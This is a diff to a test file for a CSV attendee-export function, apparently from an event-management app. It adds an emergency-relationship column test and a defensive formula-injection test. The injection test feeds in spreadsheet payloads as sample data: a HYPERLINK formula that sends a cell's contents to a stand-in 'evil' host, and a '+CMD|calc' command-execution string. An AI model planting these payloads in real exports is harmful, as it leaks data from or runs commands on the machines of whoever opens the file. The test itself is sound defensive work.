@@ -97,7 +97,7 @@ describe('buildAttendeesCsv', () => {
   const kiyan = lines.find((l) => l.startsWith('Kiyan')) ?? ''
 
   it('header carries base columns + one per question in order', () => {
-    expect(header).toBe('Name,Status,Email,Phone,Postcode,Dietary,Medical,Emergency contact,Emergency phone,Arriving by 4WD?,Gear')
+    expect(header).toBe('Name,Status,Email,Phone,Postcode,Dietary,Medical,Emergency contact,Emergency phone,Emergency relationship,Arriving by 4WD?,Gear')
   })
   it('renders status label, medical, and boolean answer as Yes', () => {
     expect(kiyan).toContain('Going')
@@ -106,6 +106,42 @@ describe('buildAttendeesCsv', () => {
   })
   it('registered-no-ticket person is labelled, not dropped', () => {
     expect(lines.some((l) => l.startsWith('Charli') && l.includes('Registered (no ticket)'))).toBe(true)
+  })
+})
+
+describe('buildAttendeesCsv - formula injection (P5B3)', () => {
+  it('neutralises leading formula metacharacters with a leading apostrophe', () => {
+    const rows = [
+      row({ first_name: '=HYPERLINK("http://evil/?"&C2,"click")', ticket_status: 'confirmed' }),
+      row({ display_name: '+CMD|calc', dietary_requirements: '-2+3', medical_requirements: '@SUM(A1:A9)', ticket_status: 'confirmed' }),
+    ]
+    const csv = buildAttendeesCsv(rows, details, questions)
+    // Every attacker-controlled formula cell is prefixed with ' so a spreadsheet
+    // renders it as text. The name field also gets CSV-quoted (it contains a comma).
+    expect(csv).toContain(`"'=HYPERLINK(""http://evil/?""&C2,""click"")"`)
+    expect(csv).toContain(`'+CMD|calc`)
+    expect(csv).toContain(`'-2+3`)
+    expect(csv).toContain(`'@SUM(A1:A9)`)
+    // A raw formula cell must never appear unprefixed.
+    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m)
+    expect(csv).not.toMatch(/(^|,)@SUM/m)
+  })
+  it('leaves benign values untouched', () => {
+    const csv = buildAttendeesCsv([row({ first_name: 'Kiyan', dietary_requirements: 'None', ticket_status: 'confirmed' })], details, questions)
+    expect(csv).toContain('Kiyan')
+    expect(csv).not.toContain(`'Kiyan`)
+    expect(csv).not.toContain(`'None`)
+  })
+})
+
+describe('buildAttendeesCsv - emergency relationship column', () => {
+  it('emits the relationship after emergency phone', () => {
+    const csv = buildAttendeesCsv([
+      row({ first_name: 'Ada', ticket_status: 'confirmed', emergency_contact_name: 'Mia', emergency_contact_phone: '0400', emergency_contact_relationship: 'Partner' }),
+    ], details, [])
+    const line = csv.split('\n').find((l) => l.startsWith('Ada')) ?? ''
+    // ...Emergency contact,Emergency phone,Emergency relationship => Mia,0400,Partner
+    expect(line).toContain('Mia,0400,Partner')
   })
 })
 
